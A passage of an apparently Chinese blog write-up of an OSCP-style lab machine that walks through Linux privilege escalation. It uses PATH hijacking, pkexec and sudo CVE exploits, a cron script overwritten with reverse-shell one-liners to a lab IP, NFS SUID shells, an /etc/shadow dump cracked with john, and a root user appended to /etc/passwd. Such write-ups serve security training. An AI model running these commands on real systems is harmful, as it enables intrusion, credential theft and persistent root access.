+<p><img src="/posts/c474af54/attachment:31d18615d165604e35a7cebc4f344323" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/31d18615d165604e35a7cebc4f344323.png" alt="截图"></p>
+<p>./sh -p</p>
+<p><img src="/posts/c474af54/attachment:b1588e89ae861b651cf5a8be3909943c" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/b1588e89ae861b651cf5a8be3909943c.png" alt="截图"></p>
+<h4 id="0x02-环境变量提权"><a href="#0x02-环境变量提权" class="headerlink" title="0x02 环境变量提权"></a>0x02 环境变量提权</h4><p>在user5下 也存在s    权限的 script 文件</p>
+<p>运行后功能 等同于 ls</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ls</span><br><span class="line">chmod 777 ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:3683702f1e958e4ae63d29ab57f2f702" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3683702f1e958e4ae63d29ab57f2f702.png" alt="截图"></p>
+<p><img src="/posts/c474af54/attachment:76cb7fa7b526dde9a194c55ab52b7c01" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/76cb7fa7b526dde9a194c55ab52b7c01.png" alt="截图"></p>
+<h4 id="0x03-Pkexec提权"><a href="#0x03-Pkexec提权" class="headerlink" title="0x03 Pkexec提权"></a>0x03 Pkexec提权</h4><p><a target="_blank" rel="noopener" href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p>
+<p>前面发现有python3环境 直接尝试python3的poc</p>
+<p><img src="/posts/c474af54/attachment:e5bbbde063cb63ba9fb8daf9bae3fea3" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e5bbbde063cb63ba9fb8daf9bae3fea3.png" alt="截图"></p>
+<p>由于也存在gcc环境  可以下载c版本 然后make编译运行</p>
+<p><img src="/posts/c474af54/attachment:3dce7fca2f3771cc7eca0d6d2de137b3" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3dce7fca2f3771cc7eca0d6d2de137b3.png" alt="截图"></p>
+<h4 id="0x04-Mysql弱口令信息泄露"><a href="#0x04-Mysql弱口令信息泄露" class="headerlink" title="0x04 Mysql弱口令信息泄露"></a>0x04 Mysql弱口令信息泄露</h4><p>根据linEnum 找到mysql弱口令  root/root</p>
+<p><img src="/posts/c474af54/attachment:85454cede9f9ede13abcf5c46c06c18a" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/85454cede9f9ede13abcf5c46c06c18a.png" alt="截图"></p>
+<p>得到一个账号密码  前面cat /etc/passwd时 发现存在mysql用户 </p>
+<p>使用该用户密码 可以登录</p>
+<p>find / -user  mysql  查看mysql用户下所属文件</p>
+<p><img src="/posts/c474af54/attachment:4f86485d7a014236d4c0da8997dbfe66" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/4f86485d7a014236d4c0da8997dbfe66.png" alt="截图"></p>
+<p>cat /etc/mysql/secret.cnf  得到root用户的登录密码 【但是该密码并无法登录到root用户】</p>
+<p><img src="/posts/c474af54/attachment:fc515af20eda2b650b1fe5ad634d85d8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/fc515af20eda2b650b1fe5ad634d85d8.png" alt="截图"></p>
+<p>/var/mysql/.informations 没权限 需要root权限才可以</p>
+<p>通过前面的pkexec 的root权限查看该文件 得到user2~user8的登录密码  user{i}@12345</p>
+<p><img src="/posts/c474af54/attachment:786d81cf96178ab0df36bdf054416ee8" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/786d81cf96178ab0df36bdf054416ee8.png" alt="截图"></p>
+<h4 id="0x05-Corntab提权"><a href="#0x05-Corntab提权" class="headerlink" title="0x05 Corntab提权"></a>0x05 Corntab提权</h4><p>cat /etc/crontab 发现在user4下存在root权限的定时任务</p>
+<p><img src="/posts/c474af54/attachment:582472a05e2291085421362b71769f72" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/582472a05e2291085421362b71769f72.png" alt="截图"></p>
+<p>先切换到user4用户下 </p>
+<p><img src="/posts/c474af54/attachment:8826051f156c1a996ed0950c5e9ff665" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/8826051f156c1a996ed0950c5e9ff665.png" alt="截图"></p>
+<p>autoscript.sh 在user4下具有写权限 </p>
+<p>用echo 覆写进去 反弹nc shell</p>
+<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.80.60/8899 0&gt;&amp;1&#x27;  </span><br></pre></td></tr></table></figure>
+
+<p>中间有 ‘  不太好处理  利用管道处理 mkfifo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;mkfifo /tmp/tmpipe;  nc 192.168.80.60 8899 0&lt;/tmp/tmpipe | /bin/bash &gt; /tmp/tmpipe 2&gt;&amp;1; rm /tmp/tmpipe&#x27; &gt; autoscript.sh</span><br><span class="line">./autoscript.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:e583500b9bd49f8f17f6c5d8e6649d57" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/e583500b9bd49f8f17f6c5d8e6649d57.png" alt="截图"></p>
+<p>得到user4用户 但是是root权限</p>
+<p><img src="/posts/c474af54/attachment:83f91e6debac4dcc69df911bdc3c239f" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/83f91e6debac4dcc69df911bdc3c239f.png" alt="截图"></p>
+<h4 id="0x06-NFS挂载提权【未成功】"><a href="#0x06-NFS挂载提权【未成功】" class="headerlink" title="0x06 NFS挂载提权【未成功】"></a>0x06 NFS挂载提权【未成功】</h4><p>前面nmap扫端口时候 发现有nfs服务</p>
+<p>利用LinEnum收集也找到了nfs相关信息</p>
+<p>/home/user5目录下开启了 no_root_squash</p>
+<p><img src="/posts/c474af54/attachment:6d355031cd6c43eb447e8213f0833a7d" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/6d355031cd6c43eb447e8213f0833a7d.png" alt="截图"></p>
+<p>1.查看NFS服务器上的共享目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo showmount -e 192.168.80.56</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:a7b3a912ff51397434d18c082b133d54" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/a7b3a912ff51397434d18c082b133d54.png" alt="截图"></p>
+<p>2.创建本地挂载目录 挂载共享目录  利用攻击机kali本地root权限创建suid shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /tmp/data</span><br><span class="line"></span><br><span class="line">sudo mount -t nfs 192.168.80.56:/home/user5  /tmp/data</span><br><span class="line"></span><br><span class="line">sudo cp /bin/sh  /tmp/data/shell</span><br><span class="line"></span><br><span class="line">sudo chmod u+s /tmp/data/shell</span><br></pre></td></tr></table></figure>
+
+<p>但是不管尝试bash 还是sh 都会报错 libtinfo.so文件缺失</p>
+<p>(在ubuntu18下 经常会出现该问题 在ubuntu20下则不会有  由于靶机是ubuntu版本所以会报错缺失so文件)</p>
+<p><img src="/posts/c474af54/attachment:9e2d8c564912663dcc3a3e4ee181e751" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/9e2d8c564912663dcc3a3e4ee181e751.png" alt="截图"></p>
+<h4 id="0x07-john-爆破密码"><a href="#0x07-john-爆破密码" class="headerlink" title="0x07 john 爆破密码"></a>0x07 john 爆破密码</h4><p>通过前面提权方式  cat /etc/shadow</p>
+<p>获取相关用户shadow信息 前面通过数据库已得到了user1-8的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::</span><br><span class="line">user1:$6$9iyn/lCu$UxlOZYhhFSAwJ8DPjlrjrl2Wv.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::</span><br><span class="line">user2:$6$7gVE7KgT$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::</span><br><span class="line">user3:$6$PaKeECW4$5yMn9UU4YByCj0LP4QWaGt/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::</span><br><span class="line">user4:$6$0pxj6KPl$NA5S/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::</span><br><span class="line">user5:$6$wndyaxl9$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::</span><br><span class="line">user6:$6$Y9wYnrUW$ihpBL4g3GswEay/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::</span><br><span class="line">mysql:$6$O2ymBAYF$NZDtY392guzYrveKnoISea6oQpv87OpEjEef5KkEUqvtOAjZ2i1UPbkrfmrHG/IonKdnYEec0S0ZBcQFZ.sno/:18053:0:99999:7:::</span><br><span class="line">user7:$6$5RBuOGFi$eJrQ4/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::</span><br><span class="line">user8:$6$fdtulQ7i$G9THW4j6kUy4bXlf7C/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>john shadow.txt</p>
+<p>得到root用户密码为 12345</p>
+<p><img src="/posts/c474af54/attachment:3e5c34d015669144524e073997b6290b" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/3e5c34d015669144524e073997b6290b.png" alt="截图"></p>
+<p>成功登录到root用户</p>
+<p><img src="/posts/c474af54/attachment:1ac6b364e251fd2be2a7d968e082c14c" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/1ac6b364e251fd2be2a7d968e082c14c.png" alt="截图"></p>
+<h4 id="0x08-sudo提权1-—-vi-提权"><a href="#0x08-sudo提权1-—-vi-提权" class="headerlink" title="0x08  sudo提权1 — vi 提权"></a>0x08  sudo提权1 — vi 提权</h4><p>登录user8  sudo -l </p>
+<p><img src="/posts/c474af54/attachment:10cc90cd82f2e5d2c0ede1393eba99c5" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/10cc90cd82f2e5d2c0ede1393eba99c5.png" alt="截图"></p>
+<p>vi 提权  参考 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/vi/">https://gtfobins.github.io/gtfobins/vi/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vi </span><br><span class="line">:!sh </span><br><span class="line">或者</span><br><span class="line">sudo vi</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:47c0ea209eb2ab89e9e8f050dbe3c484" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/47c0ea209eb2ab89e9e8f050dbe3c484.png" alt="截图"></p>
+<p><img src="/posts/c474af54/attachment:0ee35a1a8389a3f7be0d119570066355" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/0ee35a1a8389a3f7be0d119570066355.png" alt="截图"></p>
+<h4 id="0x09-sudo提权-2"><a href="#0x09-sudo提权-2" class="headerlink" title="0x09 sudo提权 2"></a>0x09 sudo提权 2</h4><p>登录到user2 </p>
+<p>sudo -l </p>
+<p><img src="/posts/c474af54/attachment:ed45f5c91b693f398b9d78415e9f6137" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/ed45f5c91b693f398b9d78415e9f6137.png" alt="截图"></p>
+<p>user2下所以  user1均具有权限</p>
+<p>登录到user1 sudo -l</p>
+<p><img src="/posts/c474af54/attachment:a814e593c544373206b840a1bcec7950" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/a814e593c544373206b840a1bcec7950.png" alt="截图"></p>
+<p>user1 具有所有权限   可直接su 登录root</p>
+<h4 id="0x0a-sudo堆缓冲区溢出提权"><a href="#0x0a-sudo堆缓冲区溢出提权" class="headerlink" title="0x0a sudo堆缓冲区溢出提权"></a>0x0a sudo堆缓冲区溢出提权</h4><p>sudo -V </p>
+<p><img src="/posts/c474af54/attachment:0b9db52b928c8be4e42773ae56c54197" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/0b9db52b928c8be4e42773ae56c54197.png" alt="截图"></p>
+<p>该版本存在sudo 堆缓冲区溢出漏洞</p>
+<p>影响版本在 </p>
+<ul>
+<li>Sudo 1.8.2 - 1.8.31p2</li>
+<li>Sudo 1.9.0 - 1.9.5p1</li>
+</ul>
+<p>POC : <a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">https://github.com/Rvn0xsy/CVE-2021-3156-plus</a> </p>
+<p>通过前面nfs挂载 直接在kali下下载poc 拷贝到user5目录下 make编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/expolit &quot;id&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:2880a7402f7c4210518eb33e87c2c1c4" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/2880a7402f7c4210518eb33e87c2c1c4.png" alt="截图"></p>
+<h4 id="0x0b-root用户组提权-—-写入-etc-passwd"><a href="#0x0b-root用户组提权-—-写入-etc-passwd" class="headerlink" title="0x0b root用户组提权  — 写入/etc/passwd"></a>0x0b root用户组提权  — 写入/etc/passwd</h4><p><code>cat /etc/group </code> 查看用户组</p>
+<p><img src="/posts/c474af54/attachment:914fe068e9208e26fbaf1fb37c59d12e" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/914fe068e9208e26fbaf1fb37c59d12e.png" alt="截图"></p>
+<p>用户user4 user7 可以修改 /etc/passwd 写入新建用户</p>
+<p>在kali下利用openssl </p>
+<p><img src="/posts/c474af54/attachment:bd93e89c27d81a9bddee7d519689fbe1" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/bd93e89c27d81a9bddee7d519689fbe1.png" alt="截图"></p>
+<p>openssl passwd -1 -salt test test</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$1$test$pi/xDtU5WFVRqYS6BMU8X/</span><br><span class="line">echo &#x27;test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c474af54/attachment:c196a2bbdcaeb87acdf306ad8f49017c" alt="截图"><img src="file:///var/folders/9f/vk166n511ng3f8ljv5qvq_tm0000gn/T/utools.notes/c196a2bbdcaeb87acdf306ad8f49017c.png" alt="截图"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><h4 id="1-内核漏洞提权"><a href="#1-内核漏洞提权" class="headerlink" title="1.内核漏洞提权"></a>1.内核漏洞提权</h4><p>根据内核版本找对应版本的漏洞进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查看系统发行版本</span><br><span class="line">lsb_release -a  </span><br><span class="line"># 查看内核版本</span><br><span class="line">uname -a </span><br></pre></td></tr></table></figure>
+
+<h4 id="2-SUID提权"><a href="#2-SUID提权" class="headerlink" title="2.SUID提权"></a>2.SUID提权</h4><p>SUID可以让程序调用者以文件所有者身份运行该文件，当我们以普通用户去运行一个root用户所有的SUID文件，那么运行该文件后就可以获取到root权限。</p>
+<p>查找具有s权限的文件</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/null </p>
+<h4 id="3-sudo提权"><a href="#3-sudo提权" class="headerlink" title="3.sudo提权"></a>3.sudo提权</h4><p>普通用户在使用sudo执行命令时，将会以root方式执行命令。在很多场景下通过配置sudoer文件可实现免密以root权限运行。通过sudo -l 查找用户下高权限第三方应用，可借助<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>进行提权。</p>
+<h4 id="4-计划任务提权"><a href="#4-计划任务提权" class="headerlink" title="4.计划任务提权"></a>4.计划任务提权</h4><p>系统中可能会有一些定时执行的任务，这些任务都由crontab管理，可通过<code>cat /etc/crontab</code>查看计划任务，检查是否存在可以利用的文件，其本质就是文件权限配置不当。</p>
+<h4 id="5-环境变量提权"><a href="#5-环境变量提权" class="headerlink" title="5. 环境变量提权"></a>5. 环境变量提权</h4><p>当在目标机器查到具有SUID权限的编译文件，则可以通过以下方法获取管理员权限</p>
+<ul>
+<li>1.echo命令法</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ls</span><br><span class="line">chmod 777 ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>2.cp 法</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /home/user5/</span><br><span class="line">cp /bin/sh /tmp/ls</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>3.软连接法(在此靶场中无法利用)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s /bin/sh /tmp/ls</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/user5/</span><br><span class="line">./script</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-第三方服务提权"><a href="#6-第三方服务提权" class="headerlink" title="6.第三方服务提权"></a>6.第三方服务提权</h4><h5 id="6-1-NFS提权"><a href="#6-1-NFS提权" class="headerlink" title="6.1 NFS提权"></a>6.1 NFS提权</h5><p>当服务器中存在nfs共享，且开启了<strong><strong>no_root_squash</strong></strong>时[可通过 cat /etc/exports查看]，如果客户端使用的是root用户，那么对于共享目录来说就有root权限，以此提升权限。</p>
+<ul>
+<li>1.查看NFS服务器共享目录</li>
+<li>2.创建本地挂载目录 挂载共享目录，利用攻击者本地root权限创建suid shell</li>
+<li>3.在服务器中以普通用户运行shell -p  以获取root权限</li>
+</ul>
+<h5 id="6-2-数据库提权"><a href="#6-2-数据库提权" class="headerlink" title="6.2 数据库提权"></a>6.2 数据库提权</h5><p>Mysql数据库提权有UDF提权、MOF提权、写入启动项等方式来提权，较为常见是则是UDF提权，具体步骤可分如下几步：</p>
+<ul>
+<li>1.连接数据库</li>
+<li>2.创建自定义函数</li>
+<li>3.设置自定义函数权限</li>
+<li>4.执行自定义函数以获取root权限</li>
+</ul>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md#Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E">https://github.com/wwl012345/Vuln-List/blob/main/Windows%26Linux%E6%8F%90%E6%9D%83%26RCE%E5%90%88%E9%9B%86.md#Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+<div>
+
+  <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------------- 💖 🌞 本 文 结 束 😚 感 谢 您 的 阅 读 🌞 💖 -------------</div>
+    
+</div>
+
+</div>
+
+<div>
+      
+        
+      
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/OSCP%E6%89%93%E9%9D%B6/" rel="tag"></i><i class="fa fa-tag"></i> OSCP打靶</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/6963a0c7/" rel="prev" title="MoeCTF_WriteUp">
+      <i class="fa fa-chevron-left"></i> MoeCTF_WriteUp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x00-LinEnum%E8%84%9A%E6%9C%AC%E6%9E%9A%E4%B8%BE"><span class="nav-number">4.1.</span> <span class="nav-text">0x00 LinEnum脚本枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-SUID%E6%8F%90%E6%9D%83"><span class="nav-number">4.2.</span> <span class="nav-text">0x01 SUID提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="nav-number">4.3.</span> <span class="nav-text">0x02 环境变量提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-Pkexec%E6%8F%90%E6%9D%83"><span class="nav-number">4.4.</span> <span class="nav-text">0x03 Pkexec提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-Mysql%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">4.5.</span> <span class="nav-text">0x04 Mysql弱口令信息泄露</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05-Corntab%E6%8F%90%E6%9D%83"><span class="nav-number">4.6.</span> <span class="nav-text">0x05 Corntab提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x06-NFS%E6%8C%82%E8%BD%BD%E6%8F%90%E6%9D%83%E3%80%90%E6%9C%AA%E6%88%90%E5%8A%9F%E3%80%91"><span class="nav-number">4.7.</span> <span class="nav-text">0x06 NFS挂载提权【未成功】</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-john-%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="nav-number">4.8.</span> <span class="nav-text">0x07 john 爆破密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x08-sudo%E6%8F%90%E6%9D%831-%E2%80%94-vi-%E6%8F%90%E6%9D%83"><span class="nav-number">4.9.</span> <span class="nav-text">0x08  sudo提权1 — vi 提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x09-sudo%E6%8F%90%E6%9D%83-2"><span class="nav-number">4.10.</span> <span class="nav-text">0x09 sudo提权 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x0a-sudo%E5%A0%86%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="nav-number">4.11.</span> <span class="nav-text">0x0a sudo堆缓冲区溢出提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x0b-root%E7%94%A8%E6%88%B7%E7%BB%84%E6%8F%90%E6%9D%83-%E2%80%94-%E5%86%99%E5%85%A5-etc-passwd"><span class="nav-number">4.12.</span> <span class="nav-text">0x0b root用户组提权  — 写入&#x2F;etc&#x2F;passwd</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span 